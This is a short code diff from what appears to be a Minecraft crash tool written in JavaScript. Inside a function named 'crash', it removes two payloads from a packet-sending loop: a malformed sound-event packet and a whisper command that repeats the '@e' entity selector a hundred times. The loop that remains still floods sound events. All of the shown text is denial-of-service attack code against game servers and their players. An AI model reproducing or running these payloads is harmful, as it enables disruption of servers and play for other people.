@@ -72,15 +72,6 @@ const crash = async (options) => {
                     entity_type: "minecraft:ender_dragon",
                     is_global: true,
                 });
-                levelSoundEvent(client, {
-                    sound_id: "BundleRemoveOne",
-                    entity_type: "",
-                    position: pos,
-                    is_global: true,
-                    extra_data: -1124852450,
-                    is_baby_mob: false,
-                });
-                runCommand(client, `w @a ${"@e".repeat(10).repeat(10)}`, ``);
                 i++;
                 if (delay) await wait(options.delay);
             }
